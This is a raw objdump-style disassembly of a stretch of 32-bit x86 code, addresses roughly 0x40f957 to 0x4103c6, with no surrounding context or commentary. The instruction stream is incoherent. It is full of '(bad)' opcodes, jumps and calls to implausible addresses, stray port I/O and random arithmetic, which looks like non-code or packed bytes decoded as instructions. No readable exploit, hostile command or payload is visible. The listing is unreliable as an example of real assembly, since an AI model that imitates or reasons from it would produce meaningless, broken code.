  40f957:	cmc    
  40f958:	jne    0x40f99d
  40f95a:	addr16 in eax,dx
  40f95c:	mov    ebx,0xabf0e542
  40f961:	aas    
  40f962:	pusha  
  40f963:	fnstsw WORD PTR [ebx-0x4c3f5ace]
  40f969:	sub    bl,BYTE PTR [edi-0x40]
  40f96c:	xor    esi,DWORD PTR [esi+0xbbc55f]
	...
  40f99a:	pusha  
  40f99b:	arpl   di,cx
  40f99d:	mov    edi,0xbbb55f11
  40f9a2:	nop
  40f9a3:	pop    edi
  40f9a4:	rcl    BYTE PTR [edi-0x3316a497],0xdd
  40f9ab:	push   ebx
  40f9ac:	jmp    0x69b0a101
  40f9b1:	shl    bh,0xf1
  40f9b4:	call   0xfb9f25e6
  40f9b9:	or     eax,esp
  40f9bb:	aam    0x5
  40f9bd:	mov    ebx,0x2bffd4d2
  40f9c2:	test   dh,dh
  40f9c4:	adc    eax,DWORD PTR ds:0xdcff5b59
  40f9ca:	daa    
  40f9cb:	jae    0x40f96f
  40f9cd:	pop    edi
  40f9ce:	ja     0x40fa2d
  40f9d0:	(bad)  
  40f9d1:	fdiv   QWORD PTR [ebx+0x5d]
  40f9d4:	je     0x40f9b7
  40f9d6:	ja     0x40f982
  40f9d8:	inc    si
  40f9da:	xlat   BYTE PTR ds:[ebx]
  40f9db:	xchg   ebx,eax
  40f9dc:	shl    ebp,0x1f
  40f9df:	or     BYTE PTR [ebx-0x4655cbb],cl
  40f9e5:	xchg   edi,eax
  40f9e6:	out    dx,al
  40f9e7:	lock call DWORD PTR [edx-0xe8ba290]
  40f9ee:	(bad)  
  40f9ef:	or     BYTE PTR [edi+0x16],ah
  40f9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f3:	rol    DWORD PTR [ebp+ecx*1-0x6d],cl
  40f9f7:	daa    
  40f9f8:	gs mov cl,0xe0
  40f9fb:	pop    edx
  40f9fc:	mov    edi,DWORD PTR [eax+eax*1+0x0]
	...
  40fa27:	add    BYTE PTR [ebx],dl
  40fa29:	inc    ecx
  40fa2a:	jmp    0x754117ce
  40fa2f:	fdivr  st(2),st
  40fa31:	les    ecx,FWORD PTR [ebp-0x1f]
  40fa34:	pop    edx
  40fa35:	push   edi
  40fa36:	shr    edx,1
  40fa38:	add    al,0x0
  40fa3a:	jmp    0xeeb49559
  40fa3f:	int    0x72
  40fa41:	(bad)  
  40fa42:	cmp    dl,bh
  40fa44:	pop    esp
  40fa45:	dec    edi
  40fa46:	push   ecx
  40fa47:	sbb    BYTE PTR [ebx-0x11],bl
  40fa4a:	ja     0x40fa83
  40fa4c:	mov    fs,WORD PTR [ebx+0x28]
  40fa4f:	sbb    BYTE PTR [ebx],cl
  40fa51:	call   FWORD PTR [eax+ebp*1]
  40fa54:	jae    0x40fa28
  40fa56:	jnp    0x40fa0e
  40fa58:	pop    esp
  40fa59:	out    0xb5,eax
  40fa5b:	cmp    BYTE PTR [esi-0x2],bl
  40fa5e:	sbb    BYTE PTR [eax],0x15
  40fa61:	add    BYTE PTR [eax],0xe3
  40fa64:	pop    ecx
  40fa65:	jne    0x40fa61
  40fa67:	sti    
  40fa68:	mov    ds:0xa10cc031,al
  40fa6d:	std    
  40fa6e:	push   DWORD PTR [edx]
  40fa70:	test   al,0xac
  40fa72:	cmp    dl,cl
  40fa74:	sub    bh,BYTE PTR [ebx-0x25a3701]
  40fa7a:	jne    0x40fa39
  40fa7c:	mov    cl,0x36
  40fa7e:	addr16 push edx
  40fa80:	mov    eax,ds:0x984c5e5d
  40fa85:	add    al,BYTE PTR [eax]
  40fa87:	test   al,0xcc
  40fa89:	jmp    0x0:0x83
	...
  40fab4:	cmp    DWORD PTR [edx-0x5e4738af],esp
  40faba:	(bad)  
  40fabb:	inc    DWORD PTR [ebp+0x1145c759]
  40fac1:	pop    edx
  40fac2:	add    BYTE PTR [eax],al
  40fac4:	jne    0x40fa92
  40fac6:	inc    ebx
  40fac7:	or     al,0xf6
  40fac9:	popa   
  40faca:	(bad)  
  40facb:	je     0x40fb19
  40facd:	ins    BYTE PTR es:[edi],dx
  40face:	mov    esi,0xc8fd372b
  40fad3:	ret    0x5941
  40fad6:	mov    ebx,0x593501
  40fadb:	jmp    0x40fac1
  40fadd:	xlat   BYTE PTR ds:[ebx]
  40fade:	jnp    0x40faf0
  40fae0:	inc    ebp
  40fae1:	sub    eax,0x46f88b05
  40fae6:	mov    DWORD PTR [eax],ebx
  40fae8:	push   edx
  40fae9:	sub    eax,0x4f58ff0c
  40faee:	call   0xfde35469
  40faf3:	or     esi,0x50
  40faf6:	jne    0x40fafd
  40faf8:	cld    
  40faf9:	sbb    eax,0x74bebf8
  40fafe:	and    eax,0xfda2927f
  40fb03:	or     DWORD PTR [edi+ebp*1],ebx
  40fb06:	mov    esp,0x3f2b557
  40fb0b:	add    BYTE PTR [edi+ebx*2],bl
  40fb0e:	add    al,0xeb
  40fb10:	psllw  mm7,QWORD PTR [edi+eax*1+0x448b7f51]
	...
  40fb40:	add    ah,al
  40fb42:	stc    
  40fb43:	dec    esi
  40fb44:	cld    
  40fb45:	sub    ecx,esi
  40fb47:	lds    eax,FWORD PTR [edi]
  40fb49:	fst    QWORD PTR [edx]
  40fb4b:	or     al,0x89
  40fb4d:	popa   
  40fb4e:	or     cl,BYTE PTR [ebx+0x1519a054]
  40fb54:	mov    esp,ecx
  40fb56:	sbb    DWORD PTR [ebp+0x5e6d9054],ecx
  40fb5c:	shl    DWORD PTR [ebx],0x33
  40fb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb60:	push   es
  40fb61:	xchg   ebp,eax
  40fb62:	mov    bh,0xba
  40fb64:	mov    cl,dl
  40fb66:	xor    eax,0x6b778345
  40fb6b:	xor    BYTE PTR [edx-0x7cf95069],bl
  40fb71:	and    al,0x72
  40fb73:	sub    eax,0xed320706
  40fb78:	rol    DWORD PTR [edi+0x74],1
  40fb7b:	mov    eax,DWORD PTR [esp+eax*2-0x7]
  40fb7f:	dec    esi
  40fb80:	cld    
  40fb81:	out    0x3a,eax
  40fb83:	(bad)  
  40fb84:	or     ebx,DWORD PTR [edi+ebx*1]
  40fb87:	(bad)  
  40fb88:	jmp    0x40fb29
  40fb8a:	mov    dh,0xae
  40fb8c:	mov    al,ds:0x41f480
  40fb91:	in     eax,0x36
  40fb93:	or     BYTE PTR [esi+0x22],dh
  40fb96:	dec    ecx
  40fb97:	(bad)  
  40fb98:	enter  0x81de,0x2
  40fb9c:	call   DWORD PTR [ecx-0x32]
  40fb9f:	mov    BYTE PTR [eax+0x1c],al
  40fba2:	call   0x0:0x67b8
	...
  40fbcd:	add    bl,bh
  40fbcf:	pop    edx
  40fbd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbd1:	mov    bl,BYTE PTR [eax+0x63]
  40fbd4:	imul   edi,DWORD PTR [esi],0xffffffe8
  40fbd7:	or     al,BYTE PTR [ecx-0x72a3bc04]
  40fbdd:	mov    eax,0x2e864750
  40fbe2:	and    BYTE PTR [ebx+esi*8-0x45],bl
  40fbe6:	retf   0xe0e5
  40fbe9:	stos   DWORD PTR es:[edi],eax
  40fbea:	push   ebx
  40fbeb:	clc    
  40fbec:	ins    DWORD PTR es:[edi],dx
  40fbed:	mov    eax,0x7ff59b26
  40fbf2:	jns    0x40fc4e
  40fbf4:	jmp    0xe526a6fc
  40fbf9:	mov    eax,0x2e4d6328
  40fbfe:	cwde   
  40fbff:	jb     0x40fc5d
  40fc01:	and    dl,BYTE PTR [ebx+0x183e715b]
  40fc07:	and    BYTE PTR [ebx+edx*1+0x384d813],ch
  40fc0e:	sbb    al,0x5b
  40fc10:	es or  BYTE PTR cs:[ebx+edx*4+0xb],bl
  40fc16:	je     0x40fc29
  40fc18:	mov    bh,BYTE PTR [eax-0x505c2e9e]
  40fc1e:	inc    esi
  40fc1f:	out    0x5,al
  40fc21:	inc    esi
  40fc22:	dec    eax
  40fc23:	das    
  40fc24:	sbb    ecx,DWORD PTR [eax+eiz*8+0x7fddfd66]
  40fc2b:	int3   
  40fc2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc2d:	add    esp,DWORD PTR [edi]
  40fc2f:	mov    DWORD PTR [edx+eax*1+0x0],ebx
	...
  40fc5b:	inc    edi
  40fc5c:	repnz push edx
  40fc5e:	add    al,0xcc
  40fc60:	pop    ebx
  40fc61:	pop    ebx
  40fc62:	or     al,0x34
  40fc64:	ds dec ecx
  40fc66:	mov    bh,0x1a
  40fc68:	pop    ebx
  40fc69:	cmp    eax,0xefd11310
  40fc6e:	stos   DWORD PTR es:[edi],eax
  40fc6f:	and    eax,0xcbb600be
  40fc74:	in     eax,0x53
  40fc76:	aad    0x9e
  40fc78:	xchg   esp,eax
  40fc79:	add    BYTE PTR [esi+ebx*1],bl
  40fc7c:	inc    esi
  40fc7d:	dec    ecx
  40fc7e:	jo     0x40fcdd
  40fc80:	dec    edi
  40fc81:	mov    ah,ah
  40fc83:	inc    ebx
  40fc84:	call   0x43dfe5c8
  40fc89:	add    eax,0x14cf8b18
  40fc8e:	sbb    BYTE PTR [ebx+0xd76f8cf],dl
  40fc94:	arpl   ax,bp
  40fc96:	lahf   
  40fc97:	(bad)  
  40fc98:	pop    ecx
  40fc99:	inc    al
  40fc9b:	sbb    esi,DWORD PTR es:[ebx+ebp*8+0x76]
  40fca0:	jg     0x40fcf1
  40fca2:	push   esi
  40fca3:	in     eax,dx
  40fca4:	push   edx
  40fca5:	(bad)  
  40fca6:	aam    0xd3
  40fca8:	inc    edx
  40fca9:	adc    al,0xc8
  40fcab:	retf   0xfe59
  40fcae:	mov    ah,0xd3
  40fcb0:	inc    edx
  40fcb1:	or     cl,cl
  40fcb3:	retf   0x3c59
  40fcb6:	jmp    0x9f4797da
  40fcbb:	sbb    eax,0x6a0946
	...
  40fce8:	and    eax,0xe19c014f
  40fced:	inc    esp
  40fcee:	sbb    DWORD PTR [esi],ecx
  40fcf0:	or     eax,0xeb5ae957
  40fcf5:	pop    ecx
  40fcf6:	(bad)  
  40fcf7:	fst    QWORD PTR es:[esi+0x1]
  40fcfb:	jmp    0xa4ca581f
  40fd00:	sub    esp,DWORD PTR [edx]
  40fd02:	add    ecx,ebp
  40fd04:	pop    ds
  40fd05:	pop    ebx
  40fd06:	add    dh,bl
  40fd08:	in     al,dx
  40fd09:	push   edx
  40fd0a:	jmp    0xfe9affe4
  40fd0f:	bound  ebx,QWORD PTR [edi+edx*2-0x38]
  40fd13:	add    bh,al
  40fd15:	ins    DWORD PTR es:[edi],dx
  40fd16:	add    BYTE PTR [ebp-0x72],dl
  40fd19:	add    dl,BYTE PTR [edi-0x75]
  40fd1c:	xor    BYTE PTR [ebx-0x7f],ah
  40fd1f:	sar    ch,0xad
  40fd22:	call   0xff532023
  40fd27:	mov    edi,DWORD PTR [ebp+0x7a0c7510]
  40fd2d:	pop    ecx
  40fd2e:	push   DWORD PTR [ebp-0x2b]
  40fd31:	loopne 0x40fd79
  40fd33:	add    al,0x46
  40fd35:	xchg   ebx,eax
  40fd36:	or     al,0x0
  40fd38:	shl    DWORD PTR [eax-0x3],1
  40fd3b:	jne    0x40fcf6
  40fd3d:	loop   0x40fd85
  40fd3f:	or     BYTE PTR ds:0x4d087512,dl
  40fd45:	outs   dx,DWORD PTR ds:[esi]
  40fd46:	push   0x44e54aff
  40fd4b:	adc    al,0x0
	...
  40fd75:	cmp    al,0x56
  40fd77:	mov    dh,0x1
  40fd79:	test   DWORD PTR [ebp+0x0],ebx
  40fd7c:	pop    edi
  40fd7d:	dec    esp
  40fd7e:	sbb    al,0xe
  40fd80:	add    BYTE PTR [eax+0x3183e9e4],dh
  40fd86:	or     cl,BYTE PTR [ebx+0x185155]
  40fd8c:	add    BYTE PTR [ebp+0x272b005d],al
  40fd92:	or     DWORD PTR [ebp+0xc],eax
  40fd95:	je     0x40fdf4
  40fd97:	add    BYTE PTR [eax],al
  40fd99:	jp     0x40fd84
  40fd9b:	mov    edi,0x619883
  40fda0:	jne    0x40fe08
  40fda2:	adc    BYTE PTR [ebp+0x14],dh
  40fda5:	lahf   
  40fda6:	pop    esp
  40fda7:	push   0x0
  40fda9:	lahf   
  40fdaa:	pop    ebp
  40fdab:	call   0xff503840
  40fdb0:	jmp    0x415ac1
  40fdb5:	sbb    al,0xc5
  40fdb7:	xor    eax,0xdfaf1d0c
  40fdbc:	dec    BYTE PTR [ecx+0x1474b532]
  40fdc2:	sub    dh,BYTE PTR [ecx]
  40fdc4:	bound  eax,QWORD PTR [ebx]
  40fdc6:	adc    cl,BYTE PTR [edx+0x2e09f844]
  40fdcc:	adc    al,0x86
  40fdce:	inc    edx
  40fdcf:	sub    BYTE PTR [ecx+ebx*4],al
  40fdd2:	jg     0x40fd8c
  40fdd4:	dec    edi
  40fdd5:	hlt    
  40fdd6:	imul   esi,DWORD PTR [ebx+0xfe],0x0
	...
  40fe00:	add    BYTE PTR [eax],al
  40fe02:	fcmovnu st,st(3)
  40fe04:	add    al,0x2
  40fe06:	sbb    al,0x42
  40fe08:	cmp    DWORD PTR [eax+ebx*1+0x44],0x57c3232f
  40fe10:	adc    bh,bh
  40fe12:	xor    DWORD PTR [edx],edi
  40fe14:	stos   BYTE PTR es:[edi],al
  40fe15:	sbb    eax,0x88b3c13e
  40fe1a:	popa   
  40fe1b:	mov    dh,0xb3
  40fe1d:	je     0x40fe27
  40fe1f:	sbb    al,0x2
  40fe21:	push   0x20
  40fe23:	mov    bh,0x3d
  40fe25:	cld    
  40fe26:	in     al,dx
  40fe27:	test   eax,0x998bfef6
  40fe2c:	test   eax,0x2421dd6
  40fe31:	cmp    ecx,0x35
  40fe34:	add    DWORD PTR [ebp+0x3c],esi
  40fe37:	sub    DWORD PTR ds:0xb544f610,0x475a1474
  40fe41:	bound  ebx,QWORD PTR [ebx+0x69]
  40fe44:	mov    bl,0x74
  40fe46:	sub    ah,ch
  40fe48:	add    BYTE PTR [edx+0x1c],ch
  40fe4b:	in     al,dx
  40fe4c:	add    eax,ebp
  40fe4e:	and    al,0x51
  40fe50:	mov    ch,0xfe
  40fe52:	inc    ebp
  40fe53:	xchg   ebx,eax
  40fe54:	add    DWORD PTR [eax],eax
  40fe56:	sbb    al,0x5b
  40fe58:	push   0x36
  40fe5a:	sbb    BYTE PTR [edi+0x54],bl
  40fe5d:	loope  0x40fe81
  40fe5f:	into   
  40fe60:	div    DWORD PTR [eax+edx*4+0x60bf63]
	...
  40fe8f:	jl     0x40fee9
  40fe91:	(bad)  
  40fe92:	mov    ah,BYTE PTR [eax+0x57]
  40fe95:	mov    edi,0xe7c5282e
  40fe9a:	sub    DWORD PTR [eax],esp
  40fe9c:	out    0x24,al
  40fe9e:	mov    eax,0xb5974363
  40fea3:	jmp    0xe75b:0x1c8b9157
  40feaa:	sbb    BYTE PTR [eax+0x67],0xe4
  40feae:	sub    ebx,DWORD PTR cs:[eax-0x3]
  40feb2:	adc    esi,DWORD PTR [esi]
  40feb4:	popa   
  40feb5:	jle    0x40fee5
  40feb7:	adc    al,0x43
  40feb9:	je     0x40fedd
  40febb:	mov    ebx,0x1c023057
  40fec0:	pop    ebx
  40fec1:	out    0xaa,eax
  40fec3:	ss pop edx
  40fec5:	out    0x3,eax
  40fec7:	lahf   
  40fec8:	aad    0xe3
  40feca:	std    
  40fecb:	adc    BYTE PTR [ebx+0x4e],bh
  40fece:	cs sub al,0xc5
  40fed1:	out    dx,eax
  40fed2:	mov    ah,0x10
  40fed4:	arpl   WORD PTR [edi-0x2c],cx
  40fed7:	cld    
  40fed8:	push   edi
  40fed9:	aaa    
  40feda:	mov    ah,0xf0
  40fedc:	outs   dx,BYTE PTR ds:[esi]
  40fedd:	rol    DWORD PTR [eax],0x6
  40fee0:	pop    ebx
  40fee1:	xchg   ecx,eax
  40fee2:	add    esi,DWORD PTR [esi+eax*1+0x1e]
  40fee6:	mov    ah,0x62
  40fee8:	inc    ecx
  40fee9:	lods   eax,DWORD PTR ds:[esi]
  40feea:	add    bl,BYTE PTR [ebx+ebx*2]
  40feed:	push   0x36
  40feef:	and    BYTE PTR [eax+0x7c],ah
  40fef2:	jecxz  0x40fef4
	...
  40ff1c:	dec    edx
  40ff1d:	int    0xd7
  40ff1f:	sub    DWORD PTR [eax+ebx*2],edx
  40ff22:	add    DWORD PTR [edi+eiz*1+0x43],edi
  40ff26:	mov    eax,0xfe586888
  40ff2b:	pop    esp
  40ff2c:	add    al,0xc5
  40ff2e:	add    DWORD PTR [ebx+0x18],edx
  40ff31:	lds    eax,FWORD PTR [eax]
  40ff33:	shl    DWORD PTR [esi-0x4e3101a8],0x75
  40ff3a:	(bad)  
  40ff3b:	call   0xedbcd95f
  40ff40:	pop    es
  40ff41:	rcr    BYTE PTR [esi+ebp*4],1
  40ff44:	gs push edi
  40ff46:	add    ecx,ebp
  40ff48:	pop    ds
  40ff49:	pop    ebx
  40ff4a:	std    
  40ff4b:	sbb    al,0x4
  40ff4d:	rol    DWORD PTR [eax],0x13
  40ff50:	adc    al,0xe8
  40ff52:	inc    ebx
  40ff53:	xchg   ebp,eax
  40ff54:	jo     0x40ff99
  40ff56:	gs (bad) 
  40ff58:	(bad)  
  40ff59:	push   ebp
  40ff5a:	call   0x9c1fe3
  40ff5f:	push   0xd
  40ff61:	addr16 pop es
  40ff63:	cld    
  40ff64:	sub    ebx,DWORD PTR [esi]
  40ff66:	inc    esp
  40ff67:	ins    DWORD PTR es:[edi],dx
  40ff68:	sbb    DWORD PTR [ebx+0x0],ebx
  40ff6b:	jmp    0xd355cede
  40ff70:	pop    ds
  40ff71:	rol    DWORD PTR [esp+eiz*2],0xe5
  40ff75:	push   esi
  40ff76:	push   ecx
  40ff77:	inc    ecx
  40ff78:	ficom  DWORD PTR [esi+edi*8+0x46]
  40ff7c:	test   eax,0xe90131
	...
  40ffa9:	pop    ds
  40ffaa:	fidivr DWORD PTR [ebx-0x1b]
  40ffad:	jns    0x40ff7e
  40ffaf:	or     dh,BYTE PTR [ecx+0x18]
  40ffb2:	pop    ebx
  40ffb3:	add    cl,ch
  40ffb5:	mov    BYTE PTR [ecx],ah
  40ffb7:	add    ecx,ebp
  40ffb9:	pop    ds
  40ffba:	fidivr DWORD PTR [ebx-0x1b]
  40ffbd:	pop    edx
  40ffbe:	iret   
  40ffbf:	or     dl,BYTE PTR [ecx+0x18]
  40ffc2:	pop    ebx
  40ffc3:	add    BYTE PTR [eax],al
  40ffc5:	xor    eax,0x3500baf7
  40ffca:	pop    edx
  40ffcb:	cmp    DWORD PTR [ebp+0x41],0x3e557056
  40ffd2:	xor    BYTE PTR [edx+0x51],dh
  40ffd5:	mov    ah,0x8a
  40ffd7:	or     al,0x0
  40ffd9:	xor    eax,0x3d73069a
  40ffde:	or     dh,BYTE PTR [ebp+0xc]
  40ffe1:	jb     0x40ff86
  40ffe3:	hlt    
  40ffe4:	xor    DWORD PTR [eax+0x13],0xa
  40ffe8:	rcl    DWORD PTR [eax+0x13],1
  40ffeb:	push   DWORD PTR [ebp-0x47]
  40ffee:	icebp  
  40ffef:	add    BYTE PTR [esi-0x3e],ah
  40fff2:	or     BYTE PTR [ecx+0x7508bd45],cl
  40fff8:	adc    BYTE PTR [edx+0x38fff492],al
  40fffe:	pop    es
  40ffff:	push   DWORD PTR [ebp-0x43]
  410002:	icebp  
  410003:	pop    ecx
  410004:	pusha  
  410005:	mov    ds:0xe975ff08,al
  41000a:	ja     0x41000e
  41000c:	inc    DWORD PTR [eax]
	...
  410036:	mov    eax,0x2d75ff0d
  41003b:	repnz sar ch,1
  41003e:	inc    edx
  41003f:	or     edi,edi
  410041:	jne    0x410080
  410043:	repnz mov ebx,0xb608f265
  410049:	add    DWORD PTR [ebp+0x55eb0059],eax
  41004f:	fdivr  QWORD PTR [esp+ecx*1+0x70]
  410053:	(bad)  
  410054:	push   ebx
  410055:	or     edx,DWORD PTR [edi]
  410057:	xchg   ebx,eax
  410058:	dec    edi
  410059:	add    eax,0xb5fffe55
  41005f:	arpl   WORD PTR [ecx+0x48],si
  410062:	add    dl,BYTE PTR [ebx+0x71c8f0c]
  410068:	mov    dh,0x82
  41006a:	shr    DWORD PTR [edi+0x0],0xd1
  41006e:	mov    ecx,0x4874b057
  410073:	imul   esp,DWORD PTR [edi+0x64],0x3b
  410077:	dec    esp
  410078:	jp     0x4100be
  41007a:	xor    al,0x44
  41007c:	adc    BYTE PTR ss:[ebx],ch
  41007f:	mov    dh,0xb8
  410081:	(bad)  
  410082:	test   eax,0x2474b03b
  410087:	sbb    al,BYTE PTR [edx]
  410089:	pusha  
  41008a:	adc    esp,DWORD PTR [esi]
  41008c:	mov    al,0x74
  41008e:	xor    BYTE PTR [eax+0xe89ff01],ch
  410094:	mov    al,0x74
  410096:	hlt    
  410097:	sbb    bh,BYTE PTR [ebx]
  410099:	std    
	...
  4100c2:	add    bl,dh
  4100c4:	add    eax,0xeae474b0
  4100c9:	and    esp,DWORD PTR [ebp-0x1d]
  4100cc:	cmc    
  4100cd:	ins    BYTE PTR es:[edi],dx
  4100ce:	add    BYTE PTR [edx+eax*2],bl
  4100d1:	add    ch,bl
  4100d3:	sbb    DWORD PTR [edx+0x421c0004],ebp
  4100d9:	mov    ebx,0x57422cc1
  4100de:	mov    ecx,eax
  4100e0:	je     0x410065
  4100e2:	jl     0x410108
  4100e4:	inc    edx
  4100e5:	aaa    
  4100e6:	add    eax,0x3c68b4a
  4100eb:	sbb    al,0xc9
  4100ed:	xor    eax,0xb1388708
  4100f2:	xor    eax,0xff256a84
  4100f7:	mov    eax,ecx
  4100f9:	retf   0x9f03
  4100fc:	push   esp
  4100fd:	add    dh,BYTE PTR [ebp+0x6d]
  410100:	lea    esi,ds:0x255a8408
  410106:	jmp    FWORD PTR [ebx+0x5b]
  410109:	lds    edi,FWORD PTR [edx+0x56e75f5d]
  41010f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410110:	inc    edi
  410111:	arpl   WORD PTR [edi+0x24],ax
  410114:	loopne 0x4100ca
  410116:	call   DWORD PTR [esi-0x3f7aa8a1]
  41011c:	push   0xffffffe7
  41011e:	aaa    
  41011f:	and    esp,eax
  410121:	pushf  
  410122:	adc    esi,DWORD PTR [ebx]
  410124:	mov    ebx,DWORD PTR [esi+0x6]
	...
  41014f:	add    BYTE PTR [edi-0x57fc042a],bl
  410155:	bound  esi,QWORD PTR [edx+0x56]
  410158:	xor    BYTE PTR [eax+ebx*2+0x8],dl
  41015c:	mov    ds:0x242e6a58,eax
  410161:	pop    ebx
  410162:	cmp    edi,ebx
  410164:	xchg   esi,eax
  410165:	lods   eax,DWORD PTR ds:[esi]
  410166:	fist   WORD PTR [ebx-0x55]
  410169:	pop    eax
  41016a:	push   0x5
  41016c:	and    al,0x22
  41016e:	stos   BYTE PTR es:[edi],al
  41016f:	pop    ss
  410170:	sbb    al,0xae
  410172:	jb     0x410113
  410174:	sahf   
  410175:	push   ds
  410176:	mov    esp,0x2ce07258
  41017b:	adc    al,0xdb
  41017d:	pop    edx
  41017e:	out    0x3,eax
  410180:	sbb    al,0x5b
  410182:	jb     0x4101ca
  410184:	adc    BYTE PTR [eax+ebp*8],bl
  410187:	add    ebx,DWORD PTR [ebx+ebx*2]
  41018a:	out    0x84,eax
  41018c:	xor    BYTE PTR [ebx-0x19],ah
  41018f:	ss adc al,0x80
  410192:	daa    
  410193:	push   ecx
  410194:	inc    ebx
  410195:	and    ch,BYTE PTR [edx]
  410197:	call   FWORD PTR [ebx+0x7bfbdd54]
  41019d:	in     eax,dx
  41019e:	stos   DWORD PTR es:[edi],eax
  41019f:	mov    al,0x8a
  4101a1:	pop    edi
  4101a2:	daa    
  4101a3:	ss adc al,0x80
  4101a6:	daa    
  4101a7:	push   ecx
  4101a8:	(bad)  [ecx]
  4101aa:	add    DWORD PTR [ebx],ebp
  4101ac:	jae    0x410201
  4101ae:	mov    DWORD PTR [edi+esi*4+0xf17454],esp
	...
  4101dd:	xchg   DWORD PTR [eax],eax
  4101df:	pop    edi
  4101e0:	push   ds
  4101e1:	mov    WORD PTR [esp+eax*2],ds
  4101e4:	sbb    eax,0xe9005b1e
  4101e9:	retf   0xec9e
  4101ec:	cdq    
  4101ed:	ret    0xf49e
  4101f0:	cdq    
  4101f1:	ins    BYTE PTR es:[edi],dx
  4101f2:	into   
  4101f3:	or     BYTE PTR [ecx],al
  4101f5:	push   esp
  4101f6:	push   ecx
  4101f7:	(bad)  
  4101f8:	out    dx,al
  4101f9:	xor    eax,0x265eec9e
  4101fe:	fdivr  DWORD PTR [ebx-0x2b]
  410201:	and    bh,al
  410203:	add    al,0xe2
  410205:	in     eax,dx
  410206:	into   
  410207:	or     BYTE PTR [edx],al
  410209:	loopne 0x4101bb
  41020b:	pop    ebp
  41020c:	mov    al,0xde
  41020e:	data16 add BYTE PTR [edx],dl
  410211:	gs aas 
  410213:	mov    BYTE PTR [eax+edx*4],ch
  410216:	fstp   TBYTE PTR [ebx-0x3f]
  410219:	and    BYTE PTR [ebx-0x60],bl
  41021c:	jmp    0xa96a654a
  410221:	push   0xffffffb2
  410223:	(bad)  
  410224:	stos   DWORD PTR es:[edi],eax
  410225:	sbb    al,0x5b
  410227:	mov    DWORD PTR [eax+ebp*4],esp
  41022a:	sbb    esp,ecx
  41022c:	jmp    0x41029d
  41022e:	inc    ebx
  41022f:	imul   eax,DWORD PTR ds:0x2c88518b,0xa6f8e56c
  410239:	push   ebp
  41023a:	aaa    
  41023b:	add    ecx,ebp
  41023d:	pop    ds
  41023e:	pop    ebx
  41023f:	jmp    0x41025e
	...
  410268:	add    BYTE PTR [eax],al
  41026a:	popf   
  41026b:	xchg   edi,eax
  41026c:	lock mov ecx,0xb9f4979c
  410272:	mov    edx,0xed0008c7
  410277:	cmp    edx,0x4cd63aff
  41027d:	lock outs dx,BYTE PTR ds:[esi]
  41027f:	fwait
  410280:	call   0xd09683fc
  410285:	je     0x4102ec
  410287:	add    DWORD PTR [ebp-0x4],esi
  41028a:	sub    eax,0x2aff6462
  41028f:	ss mov esi,0xc00f7a5e
  410295:	or     al,0x35
  410297:	das    
  410298:	dec    ebp
  410299:	call   0xac25a5d8
  41029e:	(bad)  
  41029f:	mov    ebp,eax
  4102a1:	add    BYTE PTR [ebx+0x417d8157],dh
  4102a7:	pop    esi
  4102a8:	jae    0x41026b
  4102aa:	xchg   BYTE PTR [ebx+0x597000e8],cl
  4102b0:	cmp    DWORD PTR [ebp-0xf],0xda10735d
  4102b7:	xchg   edx,eax
  4102b8:	cld    
  4102b9:	call   0x3e7f73
  4102be:	push   ds
  4102bf:	pop    ss
  4102c0:	pop    esp
  4102c1:	pop    edi
  4102c2:	mov    esp,0x76000a1b
  4102c7:	mov    esp,esp
  4102c9:	add    BYTE PTR [eax],dh
  4102cb:	fs out 0x8b,eax
	...
  4102f6:	add    ch,al
  4102f8:	pop    ebp
  4102f9:	add    BYTE PTR [ebx+0x75fd6700],cl
  4102ff:	xchg   ecx,eax
  410300:	sar    ch,1
  410302:	mov    al,BYTE PTR [eax]
  410304:	add    eax,ecx
  410306:	loopne 0x4102cf
  410308:	lods   eax,DWORD PTR ds:[esi]
  410309:	call   0xff4319ee
  41030e:	mov    DWORD PTR [eax+0x21],esi
  410311:	mov    edi,DWORD PTR [ebp+0x59]
  410314:	aad    0x74
  410316:	cld    
  410317:	sbb    al,0x9d
  410319:	dec    ecx
  41031a:	lods   eax,DWORD PTR ds:[esi]
  41031b:	xchg   edi,eax
  41031c:	xchg   ebx,eax
  41031d:	mov    BYTE PTR [esp+edi*2+0x43],0x2
  410322:	add    BYTE PTR [edi+edi*4],bl
  410325:	dec    eax
  410326:	loopne 0x4102f4
  410328:	mov    dh,0x48
  41032a:	hlt    
  41032b:	int3   
  41032c:	cmc    
  41032d:	scas   al,BYTE PTR es:[edi]
  41032e:	je     0x410344
  410330:	ins    BYTE PTR es:[edi],dx
  410331:	sahf   
  410332:	cli    
  410333:	pop    ebx
  410334:	jo     0x410330
  410336:	mov    edi,0x7c8337c8
  41033b:	push   eax
  41033c:	inc    ebx
  41033d:	ss push es
  41033f:	lahf   
  410340:	(bad)  
  410341:	mov    eax,ds:0x8319b0ff
  410346:	jl     0x410384
  410348:	inc    ebx
  410349:	or     BYTE PTR ss:[ebx],ch
  41034c:	(bad)  
  41034d:	mov    eax,ds:0xaba499e7
  410352:	(bad)  
  410353:	sbb    ebp,DWORD PTR [eax+0x2846e7d0]
  410359:	lods   al,BYTE PTR ds:[esi]
  41035a:	inc    BYTE PTR [eax]
	...
  410384:	or     ebp,DWORD PTR [eax-0x5a761850]
  41038a:	stos   DWORD PTR es:[edi],eax
  41038b:	inc    BYTE PTR [edi+0x2]
  41038e:	dec    edi
  41038f:	pop    edi
  410390:	in     eax,0x4
  410392:	add    DWORD PTR [eax],eax
  410394:	xchg   edi,eax
  410395:	ja     0x41033b
  410397:	stos   BYTE PTR es:[edi],al
  410398:	jecxz  0x410321
  41039a:	test   al,0x82
  41039c:	pop    ecx
  41039d:	(bad)  
  41039e:	add    al,0x74
  4103a0:	sbb    al,ch
  4103a2:	sub    eax,0x90671cf4
  4103a7:	mov    bl,BYTE PTR [ecx+0x46]
  4103aa:	lods   eax,DWORD PTR ds:[esi]
  4103ab:	je     0x410385
  4103ad:	rol    DWORD PTR [edi+edi*8],0x29
  4103b1:	(bad)  
  4103b2:	pushf  
  4103b3:	dec    ecx
  4103b4:	aas    
  4103b5:	shr    DWORD PTR [ebx-0x18a4e249],0x3
  4103bc:	sbb    al,0xb1
  4103be:	mov    esi,0xe75f5dba
  4103c3:	push   esi
  4103c4:	xchg   edi,eax
  4103c5:	aas    
  4103c6:	imul   ecx,eax,0x5b
